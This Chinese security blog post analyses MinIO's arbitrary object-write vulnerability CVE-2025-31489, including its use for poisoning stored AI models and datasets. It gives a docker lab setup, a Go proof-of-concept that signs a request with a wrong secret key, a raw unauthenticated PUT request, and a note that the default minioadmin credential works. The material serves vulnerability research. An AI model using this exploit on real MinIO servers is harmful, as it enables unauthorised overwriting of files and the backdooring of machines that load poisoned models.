#  云对象存储桶写漏洞？模型和数据被投毒、机器沦陷？- AI & 云安全   
原创 lufeisec  lufeisec   2025-04-21 00:00  
  
# 一、前言  
  
随着云计算的兴起，私有云也逐渐成为企业数字化转型的重要选择之一。然而，无论是公有云还是私有云，在建设过程中都曾爆出过许多安全漏洞。今天，我们就来聊一聊最近爆出的私有云的对象存储系统的漏洞（可以导致任意覆盖写桶里面的文件）以及这个漏洞在AI安全场景挖掘以及影响。  
  
注：云越来越普遍了，涉及到云上攻防的内容也越来越多，上次聊的是公有云对象存储的问题，这次聊的是私有云对象存储的问题。  
  
  
云安全系列：  
  
[你的k8s集群又被拿下了？IngressNightmare - 云安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484462&idx=1&sn=002c1dbfb0b80b864ced504d495ee5b3&scene=21#wechat_redirect)  
  
  
[21年挖的对象存储漏洞到现在结束了吗？- 云安全](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484412&idx=1&sn=a5e2f663197fdd2fda9f5c1e854866a3&scene=21#wechat_redirect)  
  
  
# 二、什么是MinIO  
  
MinIO 是在 GNU Affero 通用公共许可证 v3.0 下发布的高性能对象存储。它与 Amazon S3 云存储服务的 API 兼容。使用 MinIO 为机器学习、分析和应用程序数据工作负载构建高性能基础设施。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2AmJfSnTibjBKgVEFB0VicY02zAFQxZa7ohJAibaQXuAWjbJtRMnqKIKYg/640?wx_fmt=png&from=appmsg "null")  
  
# 三、漏洞危害  
## 3.1、投毒大模型-机器沦陷/训练出错  
  
在AI日常开发训练场景中使用MinIO进行存储，利用此漏洞我们可以进行投毒大模型，通过覆盖大模型文件，可导致加载模型的机器中毒或者进行商业破坏训练结果。  
  
大模型供应链安全（包含投毒的细节）：  
  
加载数据集或模型可能就中毒！大模型供应链安全：[https://mp.weixin.qq.com/s/hVduOzrT7KdNIVPQXfQ3Fw](https://mp.weixin.qq.com/s?__biz=MzU1NzkwMzUzNg==&mid=2247484075&idx=1&sn=a71cb46d562c054d628237d8623eeffa&scene=21#wechat_redirect)  
  
  
投毒导致的危害：  
  
“字节跳动发生大模型训练被实习生投毒事件。据悉，该事件发生在字节跳动商业化团队，因实习生对团队资源分配不满，利用HF（huggingface）的漏洞，通过共享模型注入破坏代码，导致团队模型训练成果受损。”  
  
下面是测试代码，模拟利用漏洞覆盖模型，对大模型文件投毒。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2Zcuj5XU8mYA7uuNrbIhibLYnAPfsP1FFhmX1xUejFnXnMCrwWSk46ng/640?wx_fmt=png&from=appmsg "null")  
  
  
模拟业务下载存储桶的里面模型进行加载模型，自动执行了w命令（可执行其他命令），这里w命令是模拟的后门。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2mQkicMrMib0xnKOAPTXDCIdC18sBibhfbskbny8wfyrjHHCzQVOSbYTSg/640?wx_fmt=png&from=appmsg "null")  
  
## 3.2、投毒数据集-沦陷机器/修改模型回答  
  
在AI日常开发训练场景中使用MinIO进行存储，利用此漏洞可以将大模型学习的数据集进行污染，大模型训练的机器加载数据集的时候，同样会被投入后门，造成机器沦陷。（流程跟上面是一样的）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L262BPgfb7hskjd8ohPmaX6ick0c3aNic4iabLLhR5I25vg6tNSBGIAUarA/640?wx_fmt=png&from=appmsg "null")  
  
## 3.3、危害用户数据的完整性  
  
上面两个例子中演示的是在大模型训练使用的时候可以导致机器被沦陷，当然也可以去更改js文件窃取cookie、更改其他配置或者数据，可能造成更严重的后果。  
  
云对象存储的完整性收到破坏，业务将毁于一旦。  
# 四、漏洞分析  
  
漏洞公告（CVE-2025-31489）：  
  
1、make sure to validate signature unsigned trailer stream: https://github.com/minio/minio/pull/21103  
  
2、https://github.com/golang/vulndb/issues/3594  
  
3、https://github.com/minio/minio/commit/8c70975283f9f4ce80f331a25c7475a36279e519  
  
MinIO在 PUT实现Trailer中，允许任何未经过校验acces-key上传对象（该acces-key对存储桶具有 “WRITE” 权限），acces-key 是一个公共信息，如预签名url中会暴露出来，并且经过与星光大佬的探讨中，并且不用access-key，进一步减少利用条件。  
  
先决条件：  
  
1、需要知道桶的地址（一般业务会提供桶给客户使用，可以获取地址）  
  
2、知道具有该桶写入权限的access-key（实际上这个条件可以几乎忽略，详情在文章后面）  
  
漏洞危害：  
  
可以对桶里面的文件进行写入（并且可以覆盖）  
## 4.1、环境搭建  
  
可以通过如下命令行进行搭建  
```
docker run --name minio -p 9000:9000  -p 9001:9001  -e "MINIO_ROOT_USER=minioadmin" -e "MINIO_ROOT_PASSWORD=minioadmin"  minio/minio:RELEASE.2025-02-03T21-03-04Z minio server /home/shared --console-address ":9001" --address ":9000"
```  
## 2.2、疑似sink点  
  
通过github的commit以及后续的debug，疑似sink在这里（通过newUnsignedV4ChunkedReader函数绕过权限校验写文件），minio在这里增加了鉴权校验。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2k8CichNDvF8IvY5Tp6R19NoWqO3ZsUwvufYUhbKPXibAmphlicgGjWqDA/640?wx_fmt=png&from=appmsg "null")  
  
  
那如何分析整个数据链路呢？  
## 2.3、入口以及路由分析  
  
minio使用的是golang自带的库，"net/http",通过HandlerFunc注册了一个put /xxx的方法即可，没有太复杂的路由，比较简单，很快就能找到对应的路由（如何构造http请求进入到这个函数中）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2q2BDtWmg8qev2F423bODKqxPgOrbMyr33LeUbWIxs2ybtRGAPGRx3A/640?wx_fmt=png&from=appmsg "null")  
  
```
// PutObject
router.Methods(http.MethodPut).Path("/{object:.+}").
    HandlerFunc(s3APIMiddleware(api.PutObjectHandler, traceHdrsS3HFlag))


```  
## 2.4、数据流分析  
  
来到PutObjectHandler函数中，这里观察到进入sink点需要解决两个问题：需要绕过isPutActionAllowed函数校验、以及满足rAuthType参数。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2iaffVyfhh82dW7CG9g5oric9aJ92tP0hebUYxiafDsupqppuS27fBSlXw/640?wx_fmt=png&from=appmsg "null")  
  
### 2.4.1、解决rAuthType的校验  
  
rAuthType是通过getRequestAuthType函数获取到的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2chB77pqnK69xlfjwFEoiaqr0PuoIIlYJ0lZm6jhnOnCFyz8jZLd0QbQ/640?wx_fmt=png&from=appmsg "null")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2jbD2xp1HoqAISRvOJaPcFerwP4CmoXzRFlibelY6DMPnbTqtKQUR4yg/640?wx_fmt=png&from=appmsg "null")  
  
  
一直跟到isRequestUnsignedTrailerV4函数中，发现满足两个条件即可。  
  
1、满足header头X-Amz-Content-Sha256: STREAMING-UNSIGNED-PAYLOAD-TRAILER  
  
2、满足header头Content-Encoding: aws-chunked  
  
header可以随意控制，这个校验很容易过掉。  
```
GET /test/lufeisec.txt HTTP/1.1
Host: 127.0.0.1:9000
User-Agent: lufeisec
X-Amz-Content-Sha256: STREAMING-UNSIGNED-PAYLOAD-TRAILER
Content-Encoding: aws-chunked


```  
### 2.4.2、解决isPutActionAllowed 校验  
  
第二个校验是isPutActionAllowed函数校验  
```
// Check if put is allowed
if s3Err = isPutActionAllowed(ctx, rAuthType, bucket, object, r, policy.PutObjectAction); s3Err != ErrNone {
    writeErrorResponse(ctx, w, errorCodes.ToAPIErr(s3Err), r.URL)
    return
}
```  
  
获取到ak以及ak的owner  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2mCgiaNCzibYu2a5YjibSc6CkPHJWKovSic1ia7jhficbwuBUb67C83OmBhIw/640?wx_fmt=png&from=appmsg "null")  
  
  
判断密钥是否对桶有写入权限  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2BZ3cbrHFicp9XnibVHGxwcOj9mznYvWGG74OicAu98KEkpibSF8nw1AmfA/640?wx_fmt=png&from=appmsg "null")  
  
  
如检测是否为onwer、服务账号、临时账号是否有权限等等  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2icVJRoYpVMyCmlZzIyEo2MpUdmEealQIFkiaCoXrEevibBq6DeA3uRsKQ/640?wx_fmt=png&from=appmsg "null")  
  
  
我们需要试验一下，使用ak进行进行签名（使用错误密钥），是否可以写桶  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2TeeDcmCxbcSqaV471sFssKMEyb9kdcEq7VR6ibP6ccymUicmQDJLFvaA/640?wx_fmt=png&from=appmsg "null")  
  
## 2.5、达到sink点  
### 2.5.1、如何伪造签名？  
  
在minio测试案例中有对原生http请求签名的函数，我们直接使用它的签名函数即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2avA5t7e9Id3W1DhmYKd3G2KPxIQFS7x9SalLmvwf7Rb7Gda85MKBaQ/640?wx_fmt=png&from=appmsg "null")  
  
  
我们需要完成下面步骤：  
  
1、我们新建一个test桶的bucket  
  
2、新建一个对bucket有权限的AK（不需要密钥）  
  
3、即可完成对mino的桶进行写入  
```
func errSign() {
    // HTTP request to create the bucket.
    endPoint := "http://127.0.0.1:9000"
    accessKey := "xiL0MShPspD3axSWx8ES"
    secretKey := "SKxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
    bucketName := "test"
    req, err := http.NewRequest(http.MethodPut, getPutObjectURL(endPoint, bucketName, "2.txt"), nil)
    req.Header.Set("X-Amz-Content-Sha256", "STREAMING-UNSIGNED-PAYLOAD-TRAILER")
    req.Header.Set("Content-Encoding", "aws-chunked")
    err = signRequestV4(req, accessKey, secretKey)
    if err != nil {
       fmt.Println(err)
    }


    fmt.Println(req.URL)
    // execute the request.
    proxyURL, err := url.Parse("http://127.0.0.1:4321")
    if err != nil {
       fmt.Println("Invalid proxy URL:", err)
       return
    }
    customTransport := &http.Transport{
       Proxy: http.ProxyURL(proxyURL),
    }
    s := &http.Client{
       Transport: customTransport,
    }
    // execute the request.
    response, err := s.Do(req)
    byts, err := io.ReadAll(req.Body)
    fmt.Println(response.Status, byts, err)
    if err != nil {
       fmt.Println(err)
    }
}


```  
### 2.5.2、如何上传东西呢？  
  
commit中也有给出案例  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2VztSk0oCrviaeMKXj6FseHmOyo1bGlcEQhiaNnPxLbXhF3esbJTnaDSQ/640?wx_fmt=png&from=appmsg "null")  
  
  
我们可以直接构造http请求包  
```
PUT /test/lufei_sec.txt HTTP/1.1
Host: 127.0.0.1:9000
Authorization: AWS4-HMAC-SHA256 Credential=xiL0MShPspD3axSWx8ES/20250415//s3/aws4_request, SignedHeaders=content-encoding;host;x-amz-content-sha256;x-amz-date, Signature=0b23e0428191d0d321106cef9f343d8f8018a8260e01323af364c2e6267aee28
Content-Encoding: aws-chunked
X-Amz-Content-Sha256: STREAMING-UNSIGNED-PAYLOAD-TRAILER
X-Amz-Date: 20250415T060543Z
Accept-Encoding: gzip, deflate, br
X-Amz-Trailer: x-amz-checksum-crc32
Connection: close


8
foobar!


0
x-amz-checksum-crc32:rK0DXg==
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2icJREnibaoicyWhmibwLr0RwJQ1MNhKTJ3eb4pQkQ8ZRib2z3D47szd601g/640?wx_fmt=png&from=appmsg "null")  
  
## 2.6、调用链  
```
cmd.newUnsignedV4ChunkedReader (streaming-v4-unsigned.go:33) github.com/minio/minio/cmd
cmd.objectAPIHandlers.PutObjectHandler (object-handlers.go:1853) github.com/minio/minio/cmd
<autogenerated>:2
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.httpTrace.func1 (http-tracer.go:190) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
gzhttp.NewWrapper.func1.1 (compress.go:519) github.com/klauspost/compress/gzhttp
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.maxClients.func1 (handler-api.go:352) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.collectAPIStats.func1 (handler-utils.go:338) github.com/minio/minio/cmd
cmd.s3APIMiddleware.func1 (api-router.go:246) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.setBucketForwardingMiddleware.func1 (generic-handlers.go:488) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.setUploadForwardingMiddleware.func1 (generic-handlers.go:601) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.setRequestValidityMiddleware.func1 (generic-handlers.go:471) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.setRequestLimitMiddleware.func1 (generic-handlers.go:137) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.setCrossDomainPolicyMiddleware.func1 (crossdomain-xml-handler.go:46) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.setBrowserRedirectMiddleware.func1 (generic-handlers.go:167) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.setAuthMiddleware.func1 (auth-handler.go:661) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.httpTracerMiddleware.func1 (http-tracer.go:89) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.addCustomHeadersMiddleware.func1 (generic-handlers.go:566) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
mux.(*Router).ServeHTTP (mux.go:228) github.com/minio/mux
cors.(*Cors).Handler.func1 (cors.go:289) github.com/rs/cors
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
cmd.setCriticalErrorHandler.func1 (generic-handlers.go:590) github.com/minio/minio/cmd
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
http.(*Server).Init.func1 (server.go:118) github.com/minio/minio/internal/http
http.HandlerFunc.ServeHTTP (server.go:2220) net/http
http.serverHandler.ServeHTTP (server.go:3210) net/http
http.(*conn).serve (server.go:2092) net/http
http.(*Server).Serve.gowrap3 (server.go:3360) net/http
runtime.goexit (asm_arm64.s:1223) runtime
 - Async Stack Trace
http.(*Server).Serve (server.go:3360) net/http


```  
# 五、构造PoC的问题  
### 4.1、解决获取ak的先决条件  
  
我们再回到globalIAMSys.IsAllowed函数，看是否可以绕过？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2vnHoKZLFDblSVT2j9v6GnhMwZS9ZmpfcicpH5kRUApEiat7YiayVIjKMw/640?wx_fmt=png&from=appmsg "null")  
  
  
cred, owner, s3Err = getReqAccessKeyV4(r, region, serviceS3)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2ktz2xX4L87UJh2N4XoKPyVdzz4XGZfciafsxacFpliaVQBhFica2K438Q/640?wx_fmt=png&from=appmsg "null")  
  
  
checkKeyValid，判断当前的密钥是否为globalActiveCred，而globalActiveCred就是我们初始化的minio的账号。  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2SC5ib0wRIknPemU82ic2ib3Z0kAJzu3f0JEImhxvZo5IzyntBticMEhs9Q/640?wx_fmt=png&from=appmsg "null")  
  
  
我们不再需要一个ak，而是需要一个管理员的账号即可，默认是minioadmin。  
  
注：对象存储的对象预签名的时候也会泄漏AK出来  
### 4.2、自定义内容修改  
  
如何修改我们自定义的想上传的内容呢？ 这里主要涉及到两块：长度检测和签名校验。  
  
长度的问题，一开始以为是len函数计算即可，后面经过翻查到下面源码，发现是使用16进制。  
```
cmd/streaming-v4-unsigned.go:127
switch {
case b >= '0' && b <= '9':
    size = size<<4 | int(b-'0')
case b >= 'a' && b <= 'f':
    size = size<<4 | int(b-('a'-10))
case b >= 'A' && b <= 'F':
    size = size<<4 | int(b-('A'-10))
default:
    if cr.debug {
       fmt.Printf("err size: %v\n", string(b))
    }
    cr.err = errMalformedEncoding
    return n, cr.err
}


```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGRd8xtsicVeBXTPPIvYgic4L2hds7I8vyGyzY3P12SdmJwDWpjU65AklcvfmejadPYpoV7nC6kyr0Hg/640?wx_fmt=png&from=appmsg "null")  
  
  
校验是使用CRC32对内容进行计算，获取到bytes结果后，再进行base64编码。  
# 五、总结  
  
文章深入分析了云对象存储 MinIO任意写桶的漏洞（CVE-2025-31489）以及填了编写PoC的坑，并且挖掘云与AI结合场景的风险场景（可导致AI业务影响）。  
  
安全BP并非只有直接拿机器权限，而是贴合业务，理解业务，才能保护好业务。  
  
  
  
知识星球：目前聚焦**红蓝对抗**  
和**反入侵**  
以及**AI落地**  
。(目前已经更新**46**  
篇原创文章而非所谓资源整合搬运的公开资源，并且保持高频输出），微信公众号的文章是来源于先矛  
  
后盾的知识星球里面（只有公开了少部分文章）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/36ssDibLXxGQNnibbibwiaIYvIRZoGhptDU4xSU4HQAERFD9ZrIBKLO5HSKXicS35JNQm714zfxFLF2QntthBRpln5Q/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/36ssDibLXxGTsR180Sxdt3MEorXYP01MgGn6o6Me2ESxqibdiaetOqQ3Vkng4EG2eN6kGxscloFBEEDZRYM596mJg/640?wx_fmt=jpeg&from=appmsg "")  
  
社群：加我lufeirider微信进群。  
  
  
  
